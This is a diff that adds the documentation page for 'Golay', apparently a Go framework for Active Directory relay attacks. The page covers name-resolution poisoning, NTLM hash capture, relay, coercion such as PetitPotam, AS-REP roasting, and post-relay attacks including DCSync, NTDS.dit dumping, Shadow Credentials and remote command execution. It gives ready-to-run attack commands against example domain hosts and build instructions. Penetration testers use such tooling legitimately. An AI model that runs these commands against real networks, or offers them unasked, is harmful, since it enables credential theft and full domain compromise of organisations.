@@ -1,0 +1,300 @@
+---
+title: "Golay"
+description: "Golay — Active Directory Relay Attack Framework"
+---
+
+<img
+  src="/tools/golay/golay.png"
+  alt="Golay"
+  className="mx-auto"
+  style={{ width:"70%" }}
+/>
+
+# Golay — Active Directory Relay Attack Framework
+
+Golay is a comprehensive **Active Directory relay attack framework** written in Go. It combines the functionality of **ntlmrelayx**, **Responder**, **Pretender**, **mitm6**, **Relay-King**, and **ASRepCatcher** into a single, statically compiled binary.
+
+**Single binary. Pure Go. Zero CGO. Cross-compiles to Linux, Windows, and macOS.**
+
+No Python interpreters, no libpcap, no Docker, no dependency hell — just drop the binary on your operator box and start relaying.
+
+---
+
+## What Golay Does
+
+Golay covers the full relay attack lifecycle from poisoning through exploitation:
+
+| Phase | Capabilities |
+| --- | --- |
+| **Poisoning** | LLMNR, mDNS, NetBIOS-NS, DHCPv6, DNS, Router Advertisement, WPAD, DNS search domain injection |
+| **Capture** | NTLMv1/v2 hashes, Kerberos pre-auth, cleartext credentials from 12 rogue protocol servers |
+| **Relay** | SMB, HTTP, LDAP, MSSQL, RPC, IMAP, WinRM, RDP — listen on 8 protocols, relay to 9 targets |
+| **Attack** | ADCS ESC1/6/8, Shadow Credentials, RBCD, DACL/DCSync, secret dumping, computer account creation, LAPS/gMSA, command execution |
+| **Coercion** | PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce, MSEven |
+| **AS-REP Roasting** | Relay mode with RC4 downgrade, listen mode with pure-Go BPF packet capture |
+| **Analysis** | SMB signing, LDAP binding, ADCS detection, WebDAV, NTLMv1 cross-protocol paths |
+
+---
+
+## How It Works
+
+Golay operates as a pipeline. Each stage can run independently or chained together for a full attack:
+
+<Steps>
+  <Step title="Poison Name Resolution">
+    Golay poisons LLMNR, mDNS, NetBIOS-NS, and DHCPv6 on the local network. Victim machines that fail DNS lookups fall back to these multicast protocols, and Golay responds with the attacker's IP address.
+
+    With `--search-domain`, Golay also injects a DNS suffix via DHCPv6 Option 24 (the mitm6 technique), causing Windows clients to resolve single-label names like "wpad" through the attacker's rogue DNS.
+  </Step>
+  <Step title="Capture Authentication">
+    When victims connect to the attacker's IP, Golay's rogue servers (SMB, HTTP, LDAP, etc.) present NTLM authentication challenges. The victim's machine automatically attempts to authenticate using the logged-in user's credentials.
+
+    For credential capture mode, hashes are extracted and saved in hashcat-compatible format. For relay mode, the authentication is forwarded to the real target instead.
+  </Step>
+  <Step title="Relay to Target">
+    Golay takes the victim's NTLM Type-1 (Negotiate), forwards it to the real target (e.g., an ADCS server, LDAP server, or SMB share), receives the Type-2 (Challenge), sends it back to the victim, captures the Type-3 (Authenticate), and forwards it to the target.
+
+    The target sees a valid authentication from the victim's account. Golay supports CVE-2019-1040 (MIC removal), CVE-2025-33073 (sign/seal stripping), and CVE-2019-1019 (target removal) for cross-protocol relay.
+  </Step>
+  <Step title="Execute Post-Auth Attack">
+    Once authenticated on the target, Golay executes one of 12 attack modules:
+
+    - **ADCS ESC8**: Request a certificate as the victim account
+    - **Shadow Credentials**: Inject a KeyCredential for PKINIT authentication
+    - **RBCD**: Configure delegation to an attacker-controlled account
+    - **DCSync**: Grant replication rights for full domain compromise
+    - **Secret Dumping**: Extract SAM hashes, LSA secrets, or NTDS.dit
+    - **Command Execution**: Run commands via SMBExec, TaskExec, or WMIExec
+  </Step>
+</Steps>
+
+---
+
+## Commands
+
+Golay is organized into top-level commands, each targeting a specific phase of the attack:
+
+| Command | Description |
+| --- | --- |
+| `golay relay` | NTLM relay — listen for auth, forward to target, execute attack |
+| `golay poison` | Name resolution poisoning — LLMNR, mDNS, NetBIOS, DHCPv6, DNS, RA |
+| `golay capture` | Rogue servers — capture NTLMv1/v2 hashes and cleartext credentials |
+| `golay coerce` | Auth coercion — force targets to authenticate back (PetitPotam, PrinterBug, etc.) |
+| `golay analyze` | Relay path analysis — scan for SMB signing, LDAP binding, ADCS, WebDAV |
+| `golay asrep` | AS-REP hash capture — relay or passive listen mode with ARP poisoning |
+| `golay socks` | SOCKS5 proxy — maintain and reuse relayed sessions |
+| `golay version` | Print version information |
+
+---
+
+## Quick Examples
+
+### Relay to ADCS for certificate enrollment (ESC8)
+
+```bash
+sudo golay relay -t http://ca.corp.local --adcs --ca ca.corp.local --template Machine
+```
+
+The relay server listens on SMB (445) and HTTP (80) by default. When a victim authenticates, Golay relays to the CA's web enrollment and requests a certificate as the victim account.
+
+### Full attack chain: Poison + Relay
+
+```bash
+# Terminal 1: Start the relay targeting LDAP for Shadow Credentials
+sudo golay relay -t ldap://dc1.corp.local --shadow-credentials \
+  --shadow-target 'CN=DC1,OU=Domain Controllers,DC=corp,DC=local'
+
+# Terminal 2: Start poisoning to redirect victims
+sudo golay poison -I eth0 -4 10.0.0.5 -6 fe80::1 \
+  --search-domain corp.local --no-ra
+```
+
+### Capture hashes (Responder mode)
+
+```bash
+sudo golay capture -I eth0 --smb --http --ldap --ftp --kerberos
+```
+
+All captured hashes are written to `./loot/` in hashcat-compatible format:
+- NTLMv2: `-m 5600`
+- NTLMv1: `-m 5500`
+- Kerberos: `-m 7500`
+
+### Coerce authentication
+
+```bash
+golay coerce -t dc1.corp.local --all --listener 10.0.0.5
+```
+
+Tries PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce, and MSEven against the target.
+
+### AS-REP hash capture with RC4 downgrade
+
+```bash
+# Relay mode: intercept, downgrade to RC4, capture AS-REP hash
+sudo golay asrep -I eth0 --mode relay --dc 10.0.0.1 --targets 10.0.0.0/24
+
+# Listen mode: passive sniffing on Linux
+sudo golay asrep -I eth0 --mode listen --targets 10.0.0.0/24
+```
+
+### Analyze relay paths
+
+```bash
+golay analyze -t dc1.corp.local -u user -p password \
+  --check-signing --check-adcs --check-ldap
+```
+
+---
+
+## Relay Server + Client Matrix
+
+<AccordionGroup>
+  <Accordion title="Relay Servers (What Golay Listens On)" icon="tower-broadcast">
+    | Protocol | Default Port | Description |
+    | --- | --- | --- |
+    | SMB | 445 | Captures NTLM from coerced SMB connections |
+    | HTTP | 80 (multi-port) | WPAD, WebDAV, general HTTP NTLM |
+    | RPC | 135 | DCE/RPC bind with NTLMSSP |
+    | MSSQL | 1433 | TDS protocol NTLM auth |
+    | WinRM | 5985 | HTTP + SOAP/WSMan |
+    | WCF | 9389 | .NET Binary Framing |
+    | RAW | 6666 | Length-prefixed raw NTLM |
+    | RDP | 3389 | X.224 + CredSSP/NLA |
+  </Accordion>
+  <Accordion title="Relay Clients (What Golay Relays To)" icon="arrow-right-to-bracket">
+    | Protocol | Description |
+    | --- | --- |
+    | ADCS (HTTP) | Certificate enrollment via /certsrv/ (ESC1/6/8) |
+    | SMB | SMB2 Negotiate + Session Setup |
+    | LDAP/LDAPS | Sicily NTLM Bind (BER-encoded) |
+    | HTTP/HTTPS | Generic HTTP NTLM relay |
+    | MSSQL | TDS Login7 + SSPI |
+    | RPC | DCE/RPC Bind + Auth3 (TSCH/ICPR) |
+    | IMAP | AUTHENTICATE NTLM |
+    | WinRM | HTTP + SOAP/WSMan |
+    | RDP | X.224 + CredSSP TSRequest |
+  </Accordion>
+  <Accordion title="Post-Relay Attacks" icon="burst">
+    | Attack | Target | Description |
+    | --- | --- | --- |
+    | ADCS ESC1/6/8 | HTTP/ADCS | Certificate enrollment with SAN abuse |
+    | Shadow Credentials | LDAP | Inject KeyCredential for PKINIT |
+    | RBCD | LDAP | Resource-Based Constrained Delegation |
+    | DACL/DCSync | LDAP | Grant replication rights |
+    | SAM/LSA Dump | SMB | Extract local hashes via winreg |
+    | NTDS.dit | SMB | Domain credential extraction |
+    | Add Computer | LDAP/SAMR | Create attacker-controlled machine account |
+    | DNS Record | LDAP | Inject/modify AD-integrated DNS |
+    | LAPS Dump | LDAP | Read ms-Mcs-AdmPwd (v1) or msLAPS-Password (v2) |
+    | gMSA Dump | LDAP | Read msDS-ManagedPassword, compute NT hash |
+    | SCCM | HTTP | Policy dump, Distribution Point extraction |
+    | Exec | SMB/RPC/WMI | SMBExec, TaskExec, WMIExec |
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Poisoning Protocols
+
+<AccordionGroup>
+  <Accordion title="LLMNR" icon="globe">
+    Listens on multicast 224.0.0.252:5355 (IPv4) and ff02::1:3:5355 (IPv6). Responds to single-label name queries with the attacker's IP. Effective when DNS fails for short hostnames.
+  </Accordion>
+  <Accordion title="mDNS" icon="globe">
+    Listens on multicast 224.0.0.251:5353 (IPv4) and ff02::fb:5353 (IPv6). Similar to LLMNR but uses the mDNS protocol and strips `.local` suffixes.
+  </Accordion>
+  <Accordion title="NetBIOS-NS" icon="globe">
+    Listens on UDP port 137. Uses first-level NetBIOS name encoding. The oldest and most reliable poisoning vector on Windows networks.
+  </Accordion>
+  <Accordion title="DHCPv6 + DNS Search Domain" icon="globe">
+    Responds to DHCPv6 Solicit/Request/Rebind/Renew/InfoReq messages, injecting the attacker as the DNS server. With `--search-domain`, injects a DNS suffix via Option 24 so Windows clients append the domain to all single-label lookups (the core mitm6 technique).
+  </Accordion>
+  <Accordion title="Router Advertisement" icon="globe">
+    Sends periodic ICMPv6 Router Advertisements with RDNSS option (RFC 8106) pointing to the attacker's IPv6 address. Triggers Windows to start DHCPv6 negotiation.
+  </Accordion>
+  <Accordion title="DNS" icon="globe">
+    Full rogue DNS server on TCP+UDP port 53. Responds to A, AAAA, ANY, SOA, and SRV queries. With `--relay-host`, returns SOA records to trigger Kerberos-authenticated DNS dynamic updates.
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Capture Servers
+
+When running in capture mode, Golay outputs hashes in **hashcat-compatible format**:
+
+| Hash Type | Hashcat Mode | Example Format |
+| --- | --- | --- |
+| NTLMv2 | `-m 5600` | `user::domain:challenge:ntproofstr:blob` |
+| NTLMv1 | `-m 5500` | `user::domain:lmresp:ntresp:challenge` |
+| Kerberos Pre-Auth | `-m 7500` | `$krb5pa$23$user$realm$hash` |
+| AS-REP (RC4) | `-m 18200` | `$krb5asrep$23$user@domain:salt$hash` |
+
+---
+
+## Global Flags
+
+```text
+-d, --debug               Enable verbose debug logging
+-I, --interface string    Network interface to bind
+-4, --ipv4 string         IPv4 address to use
+-6, --ipv6 string         IPv6 address to use
+-l, --log-file string     Write logs to file (with rotation)
+-o, --output-dir string   Output directory for loot (default: ./loot)
+    --no-color            Disable colored terminal output
+-q, --quiet               Minimal output
+```
+
+---
+
+## Tool Equivalents
+
+Golay replaces the need for running multiple separate tools:
+
+| Existing Tool | Language | Golay Equivalent |
+| --- | --- | --- |
+| ntlmrelayx (Impacket) | Python | `golay relay` |
+| Responder | Python | `golay capture` + `golay poison` |
+| Pretender | Go | `golay poison` |
+| mitm6 | Python | `golay poison --search-domain` |
+| Relay-King | Python/Go | `golay analyze` |
+| ASRepCatcher / rep-catch | Python/Go | `golay asrep` |
+
+---
+
+## Installation
+
+Golay ships as a single static binary. No runtime dependencies required.
+
+```bash
+# Build from source
+git clone https://github.com/KrakenTech-LLC/golay.git
+cd golay
+go build -o golay ./cmd/golay/
+
+# Cross-compile (no CGO required)
+GOOS=linux   GOARCH=amd64 CGO_ENABLED=0 go build -o golay-linux   ./cmd/golay/
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o golay.exe     ./cmd/golay/
+GOOS=darwin  GOARCH=arm64 CGO_ENABLED=0 go build -o golay-macos   ./cmd/golay/
+```
+
+---
+
+## Architecture
+
+Golay is organized into modular packages. Each package handles one concern and can be used independently as a library:
+
+| Package | Purpose |
+| --- | --- |
+| `pkg/relay/server/` | 8 relay listener servers |
+| `pkg/relay/client/` | 9 relay target clients |
+| `pkg/relay/ntlm/` | NTLM message handling, patching, SPNEGO |
+| `pkg/relay/socks/` | SOCKS5 proxy with session management |
+| `pkg/poison/` | 7 poisoners + filter engine |
+| `pkg/capture/` | 12 rogue protocol servers |
+| `pkg/attack/` | 12 post-relay attack modules |
+| `pkg/coerce/` | Auth coercion engine |
+| `pkg/analyze/` | Relay path analysis + scanning |
+| `pkg/asrep/` | AS-REP capture (relay + listen + ARP) |
+| `pkg/store/` | Credential storage backends |
